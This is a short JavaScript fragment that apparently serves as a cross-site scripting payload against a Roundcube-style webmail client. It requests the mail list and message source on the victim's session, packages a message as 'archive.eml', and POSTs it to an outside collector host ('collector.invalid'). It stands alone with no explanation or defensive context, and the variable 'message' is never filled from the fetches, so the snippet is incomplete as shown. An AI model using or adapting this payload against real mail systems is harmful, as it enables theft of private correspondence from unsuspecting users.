fetch('/?_task=mail&_action=list');
fetch('/?_action=viewsource');
const messageFile = new File([message], "archive.eml");
const form = new FormData();
form.append("mail", messageFile);
fetch('https://collector.invalid/messages', {method:'POST', body:form});
